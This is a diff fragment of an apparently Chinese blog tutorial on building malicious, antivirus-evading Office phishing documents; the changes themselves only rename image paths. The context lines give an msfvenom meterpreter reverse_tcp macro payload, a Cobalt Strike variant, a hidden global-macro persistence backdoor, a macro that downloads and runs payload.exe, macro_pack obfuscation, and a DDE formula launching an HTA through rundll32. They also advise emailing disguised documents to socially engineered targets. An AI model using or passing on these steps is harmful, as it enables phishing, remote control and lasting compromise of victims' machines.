@@ -230,24 +230,24 @@
 <pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f vba -o shell.vba</code></pre>
 
 <p>2.新建一个启用宏的office文档。</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001528982.png" srcset="/img/loading.gif" alt="image-20210128001528982"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/1.png" srcset="/img/loading.gif" alt="image-20210128001528982"></p>
 <p>3.然后点击并勾选：文件-选项-自定义功能区-开发工具。</p>
 <p>4.点击宏</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001945054.png" srcset="/img/loading.gif" alt="image-20210128001945054"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001945054.png" srcset="/img/loading.gif" alt="image-20210128001945054"></p>
 <p>5.创建一个新的文件宏，注意宏名只能为字母或汉字，不能为数字；选择宏的位置为第一步新建的启用宏的office文档的名字</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000409133.png" srcset="/img/loading.gif" alt="image-20210128000409133"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000409133.png" srcset="/img/loading.gif" alt="image-20210128000409133"></p>
 <p>6.将文本框里的代码全部替换为msf生成宏代码，Ctrl+s，关闭文本框，Ctrl+s，退出。</p>
 <p>7.在靶机里打开office文档，启用宏，msf上线。</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000509782.png" srcset="/img/loading.gif" alt="image-20210128000509782"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000509782.png" srcset="/img/loading.gif" alt="image-20210128000509782"></p>
 <h3 id="2-cs生成payload"><a href="#2-cs生成payload" class="headerlink" title="2.cs生成payload"></a>2.cs生成payload</h3><p>步骤和msf生成payload制作木马一样，只不过需要将msf的木马替换为cs的MS Office Macro的马。</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001050461.png" srcset="/img/loading.gif" alt="image-20210128001050461"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001050461.png" srcset="/img/loading.gif" alt="image-20210128001050461"></p>
 <h3 id="3-建立全局宏持久性后门"><a href="#3-建立全局宏持久性后门" class="headerlink" title="3.建立全局宏持久性后门"></a>3.建立全局宏持久性后门</h3><p>office宏除了用于钓鱼，还可以用来建立隐蔽的持久性后门。新建一个宏，位置要选择所有活动模版和文档。</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003712029.png" srcset="/img/loading.gif" alt="image-20210128003712029"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003712029.png" srcset="/img/loading.gif" alt="image-20210128003712029"></p>
 <p>在ThisDocument中写入宏代码，进行保存。</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003907554.png" srcset="/img/loading.gif" alt="image-20210128003907554"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003907554.png" srcset="/img/loading.gif" alt="image-20210128003907554"></p>
 <p>成功建立了一个隐藏持久性后门，打开任意文档都可以触发宏代码。</p>
 <h3 id="4-文件图标替换"><a href="#4-文件图标替换" class="headerlink" title="4.文件图标替换"></a>4.文件图标替换</h3><p>生成宏的文档和正常的文档图标不一样</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128005843267.png" srcset="/img/loading.gif" alt="image-20210128005843267"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128005843267.png" srcset="/img/loading.gif" alt="image-20210128005843267"></p>
 <p>还没找到可以替换文档图片的方法，，，不过知道替换exe图片的一个软件：Restorator</p>
 <h3 id="5-缺点"><a href="#5-缺点" class="headerlink" title="5.缺点"></a>5.缺点</h3><p>类似office宏还有一些其它利用方式，如DOCX文档远程模板注入执行宏，还可以通过shellcode进行免杀处理。在实战中，首先尽可能社工目标的各种信息，取得对方信任，根据钓鱼的目标，修改文档的名字，通过邮箱进行发送，如xx公司采购说明。</p>
 <p>office宏钓鱼存在几大不适用性：</p>
@@ -310,7 +310,7 @@
 
 <p>打开drop.xls，启用宏，就会自动下载url的payload.exe,并保存为dropped.exe，然后执行，msf上线。</p>
 <p>但是我们要做到免杀，就不要求它进行执行，所以需要对宏代码做一定的修改：</p>
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129015545405.png" srcset="/img/loading.gif" alt="image-20210129015545405"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129015545405.png" srcset="/img/loading.gif" alt="image-20210129015545405"></p>
 <p>将里面的ExecuteCmdAsync downloadPath给删除掉，并删除其构造代码，然后更改下载路径为你自己想要的路径，服务器地址为你的地址即可。</p>
 <p>然后我们此时打开该文档，就会提示我们运行宏，我们允许，则会在我们刚才设置的地方下载好我们的hta文件。然后我们将宏代码保存为vba文件，使用下面的命令将其混淆：</p>
 <pre><code class="hljs css"><span class="hljs-selector-tag">macro_pack</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.vba</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">-G</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.xls</span></code></pre>
@@ -321,7 +321,7 @@
 <p>然后我们下面就需要调用我们的hta文件了。我们说过了，要使用dde，我们这里就使用dde去调用rundll32.exe去运行我们的hta文件：</p>
 <pre><code class="hljs excel">=MSEXCEL|&#x27;\..\..\..\Windows\System32\rundll32.exe url.dll,FileProtocolHandler  <span class="hljs-symbol">c:</span>\temp\payload.hta&#x27;!_xlbgnm.<span class="hljs-symbol">A1</span></code></pre>
 
-<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129021101468.png" srcset="/img/loading.gif" alt="image-20210129021101468"></p>
+<p><img src="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129021101468.png" srcset="/img/loading.gif" alt="image-20210129021101468"></p>
 <p>有关rundll32具体信息请访问：<a target="_blank" rel="noopener" href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p>
 <p>比如当前我们的hta内容如下，那么将执行内部代码弹出计算器.</p>
 <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span> 
